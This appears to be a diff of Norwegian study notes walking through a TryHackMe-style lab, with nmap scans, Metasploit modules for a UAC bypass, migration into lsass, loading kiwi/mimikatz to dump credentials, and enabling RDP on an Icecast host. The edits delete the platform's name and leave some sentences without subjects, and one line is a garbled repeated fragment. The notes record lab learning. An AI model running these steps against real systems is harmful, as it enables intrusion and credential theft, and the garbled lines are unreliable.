@@ -11,7 +11,7 @@ nmap -sS -O -oX nmap-report --webxml 10.10.169.236	#SYN scan er veldig bra i aa 
 #Saa denne typen scan blir sett paa som aa vaere "stealth scan" og vanskelig aa bli funnet om ikke det letes etter spesifikt
 
 #Scannen saa ut til aa gaa feilfri, dette kan kanskje tyde at firewall ikke beksytter/ikke er tilstede.
-#TryHackMe sier ivertfall at firewall er nede, og faktisk at vi skal kunne se at RDP tjenesten er oppe i output.
+#sier ivertfall at firewall er nede, og faktisk at vi skal kunne se at RDP tjenesten er oppe i output.
 
 Etter litt sooking paa hva de ulike tjenestene er fant jeg ut at tjenesten/service ms-wbt-server er protokollen som brukes i RDP.
 Dette kan vaere interessangt fordi vi kan proeve aa koble oss paa serveren med en exploit!
@@ -21,10 +21,10 @@ Derfor kan det vaere smart aa gjoore en ny scan som spesifikt finner ut hvilken 
 nmap -sV 10.10.169.236 		#kan vaere smart aa begynne aa sette flagget -v for verbose, da faar vi tilbakemelding under scannen om hva som blir gjort 
 #Etter scan ser vi at tjenesten Icecast streaming media server er det som blir kjoert paa port 8000
 
-TryHackMe foreslo aa bruke https://www.cvedetails.com, der kan du sooke opp tjenester og faa dokumenterte vulnerabilities knyttet til dem. Ytterligere
+foreslo aa bruke https://www.cvedetails.com, der kan du sooke opp tjenester og faa dokumenterte vulnerabilities knyttet til dem. Ytterligere
 har exploitene CVE (Common Vulnerabilities and Exposures) nummer for aa gjenskjenne dem, i tillegg til rangering paa alorlighetsgrad. 
 
-TryHackMe sa denne tjenesten var en 2004 modell, men jeg fant ingen steder under nmap sookene hvor jeg fikk spesifikt service version dessverre. Det maa
+denne tjenesten var en 2004 modell, men jeg fant ingen steder under nmap sookene hvor jeg fikk spesifikt service version dessverre. Det maa
 jeg finne ut hvordan jeg kan gjoore til fremtiden. Skal egentlig vaere nmap -sV som gir deg all info tjenestene som kjoeres paa porter og deres versjon. 
 Med andre ord var det kanskje bare ikke mulig aa finne ut noyaktig hvilken versjon Icecast var.
 
@@ -87,8 +87,8 @@ use exploit/windows/local/bypassuac_eventvwr	#Bruker ny modul av exploit typen
 show options					#Vise hvilke options/variabler som er nodvendig for aa kjore, hva som er mulig aa gjoore i denne modulen
 #Show options viser noe spessielt her, denne modulen krever at vi har en ookt som saa denne modulen kan brukes paa. vi maa altsa sette variabelen "session"
 set session sessionNummer			#set session 2 i mitt tilfelle
-#TryHackMe pressiserte at naa som vi hadde satt variabelen/option til aa vaere lik noe saa skulle vi se nye options fra "show options". Dette var ikke tilfelle for meg
-#Iallfall sier TryHackMe at vi vaar lytte prosess har feil IP saa vi maa endre paa variabelen "lhost". Jeg saa ingen indikasjon paa at denne variabelen trengte aa endres
+#pressiserte at naa som vi hadde satt variabelen/option til aa vaere lik noe saa skulle vi se nye options fra "show options". Dette var ikke tilfelle for meg
+#Iallfall sier  at vi vaar lytte prosess har feil IP saa vi maa endre paa variabelen "lhost". Jeg saa ingen indikasjon paa at denne variabelen trengte aa endres
 #likevel satte jeg "setg lhost 34.245.220.134"
 
 Naa som vi har satt de noodvendige variablene kan vi kjoore modulen:
@@ -100,7 +100,7 @@ getprivs		#Ekstremt nyttig, faar en listet visning av rettighetene dine.
 Den nye meterpreter session med eskalerte rettigheter lar oss migrere, dette kan vaere lurt aa gjoore til en stabil prosess:
 ps				#process list/processes, da ser vi alle prosessene og deres PID. kan skrive ps lsass for aa filtrere paa denne prosessen spesifikt
 migrate skrivPIDpaaProsessenDuVilMigrereTil
-#I dette tilfellet vil TryHackMe at vi skal migrere til lsass (Local Security Authority Subsystem) som validerer innlogging av en bruker paa en pc eller en server.
+#I dette tilfellet vil at vi skal migrere til lsass (Local Security Authority Subsystem) som validerer innlogging av en bruker paa en pc eller en server.
 
 ps lsass
 		#Viktig aa notere seg to ting. For aa kunne "interacte" med lsass maa vi "bo i/living in" en process som har samme arkitektur som lsass tjenesten.
@@ -110,7 +110,7 @@ ps lsass
 		#(ett nytt i tillegg er kanskje mer riktig aa si). Dette library kalles (dll), saa vi laster et nytt dll i det kjorende programmet. Dette library har vaar
 		#malicious kode i seg. Fra dette kan vi "spawn a new thread that host our shell". 
 	
-late file MACE attributeslate file mace attributeslate file mace attributeslate file mace attributesnaa som vi har fatt administrator rettigheter kan vi gaa over til "looting" stadiet. tryhackme ber oss om aa bruke "minikatz" som er
+late file MACE attributeslate file mace attributeslate file mace attributeslate file mace attributesnaa som vi har fatt administrator rettigheter kan vi gaa over til "looting" stadiet. ber oss om aa bruke "minikatz" som er
 en veldig kjent "password dumping tool". 
 da loader vi minikatz med kommandoen:
 load kiwi		#kiwi er den oppdaterte versjonen av minikatz
@@ -144,7 +144,7 @@ Dersom RDP ikke er tillatt paa systemet kan vi tillate det gjennom:
 run post/windows/manage/enable_rdp
 
 Vi kan naa offisielt kalle oss for script kiddies! 
-#Neste steget blir aa sjekke ut hvordan du kan gjore slike manipulasjoner manuelt. TryHackMe har gitt denne linken for aa laere om manuel exploitation:
+#Neste steget blir aa sjekke ut hvordan du kan gjore slike manipulasjoner manuelt.  har gitt denne linken for aa laere om manuel exploitation:
 "Explore manual exploitation via exploit code found on exploit-db. exploit link: https://www.exploit-db.com/exploits/568"
 #spesifikt denne linken henviser faktisk til hvordan du kan manuelt hijacke Icecast for remote code execution
 #Maa tross alt huske at vi vil ikke alltid ha muligheten til aa kunne bruke metasploit. 
